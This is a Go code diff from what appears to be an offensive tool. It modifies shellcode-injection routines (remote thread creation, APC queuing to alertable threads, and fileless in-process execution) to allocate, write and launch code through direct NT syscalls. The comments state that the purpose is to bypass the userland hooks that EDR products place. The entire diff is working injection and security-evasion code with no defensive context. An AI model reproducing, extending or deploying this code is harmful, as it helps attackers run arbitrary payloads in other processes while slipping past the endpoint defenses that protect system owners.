@@ -35,8 +35,9 @@ func injectShellcode(targetPID uint32, shellcode []byte, method string) error {
 	}
 }
 
-// injectCRT opens the target process, allocates RWX memory, writes shellcode,
-// and starts a new remote thread at the shellcode address.
+// injectCRT opens the target process, allocates RWX memory via direct NT syscall,
+// writes shellcode, and starts a new thread via NtCreateThreadEx — all bypassing
+// any userland hooks EDRs place on the Win32/ntdll stubs.
 func injectCRT(pid uint32, shellcode []byte) error {
 	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
 	if err != nil {
@@ -44,39 +45,27 @@ func injectCRT(pid uint32, shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProc)
 
-	addr, _, e := procVirtualAllocEx.Call(
-		uintptr(hProc), 0, uintptr(len(shellcode)),
-		uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
-	)
-	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx: %v", e)
+	addr, err := ntAlloc(hProc, uintptr(len(shellcode)), pageExecuteReadWrite)
+	if err != nil {
+		return err
 	}
 
-	var written uintptr
-	r, _, e := procWriteProcessMemory.Call(
-		uintptr(hProc), addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&written)),
-	)
-	if r == 0 {
-		procVirtualFreeEx.Call(uintptr(hProc), addr, 0, uintptr(memRelease))
-		return fmt.Errorf("WriteProcessMemory: %v", e)
+	if err := ntWrite(hProc, addr, shellcode); err != nil {
+		ntFree(hProc, addr)
+		return err
 	}
 
-	hThread, _, e := procCreateRemoteThread.Call(
-		uintptr(hProc), 0, 0, addr, 0, 0, 0,
-	)
-	if hThread == 0 {
-		procVirtualFreeEx.Call(uintptr(hProc), addr, 0, uintptr(memRelease))
-		return fmt.Errorf("CreateRemoteThread: %v", e)
+	hThread, err := ntCreateThread(hProc, addr)
+	if err != nil {
+		ntFree(hProc, addr)
+		return err
 	}
-	windows.CloseHandle(windows.Handle(hThread))
+	windows.CloseHandle(hThread)
 	return nil
 }
 
-// injectAPC queues shellcode as an APC to all alertable threads in the target process.
-// The shellcode executes when any thread enters an alertable wait state (e.g. SleepEx).
+// injectAPC queues shellcode as an APC to all alertable threads in the target
+// process. Allocation and write use direct NT syscalls to bypass EDR hooks.
 func injectAPC(pid uint32, shellcode []byte) error {
 	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
 	if err != nil {
@@ -84,24 +73,14 @@ func injectAPC(pid uint32, shellcode []byte) error {
 	}
 	defer windows.CloseHandle(hProc)
 
-	addr, _, e := procVirtualAllocEx.Call(
-		uintptr(hProc), 0, uintptr(len(shellcode)),
-		uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
-	)
-	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx: %v", e)
+	addr, err := ntAlloc(hProc, uintptr(len(shellcode)), pageExecuteReadWrite)
+	if err != nil {
+		return err
 	}
 
-	var written uintptr
-	r, _, e := procWriteProcessMemory.Call(
-		uintptr(hProc), addr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&written)),
-	)
-	if r == 0 {
-		procVirtualFreeEx.Call(uintptr(hProc), addr, 0, uintptr(memRelease))
-		return fmt.Errorf("WriteProcessMemory: %v", e)
+	if err := ntWrite(hProc, addr, shellcode); err != nil {
+		ntFree(hProc, addr)
+		return err
 	}
 
 	tids, err := processThreadIDs(pid)
@@ -125,28 +104,24 @@ func injectAPC(pid uint32, shellcode []byte) error {
 	return nil
 }
 
-// execShellcodeSelf allocates RWX memory in the current process and executes shellcode.
-// This is fileless — no payload ever touches disk.
+// execShellcodeSelf allocates RWX memory in the current process via direct
+// NT syscall and executes shellcode. Fileless — no payload touches disk.
 func execShellcodeSelf(shellcode []byte) error {
 	if len(shellcode) == 0 {
 		return fmt.Errorf("empty shellcode")
 	}
 
-	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
-		memCommit|memReserve, pageExecuteReadWrite)
+	hSelf := windows.CurrentProcess()
+	addr, err := ntAlloc(hSelf, uintptr(len(shellcode)), pageExecuteReadWrite)
 	if err != nil {
-		return fmt.Errorf("VirtualAlloc: %w", err)
+		return err
 	}
 
-	var written uintptr
-	if err := windows.WriteProcessMemory(
-		windows.CurrentProcess(), addr,
-		&shellcode[0], uintptr(len(shellcode)), &written,
-	); err != nil {
-		return fmt.Errorf("WriteProcessMemory: %w", err)
+	if err := ntWrite(hSelf, addr, shellcode); err != nil {
+		ntFree(hSelf, addr)
+		return err
 	}
 
-	// Execute shellcode synchronously in this goroutine via raw syscall
 	syscall.SyscallN(addr)
 	return nil
 }
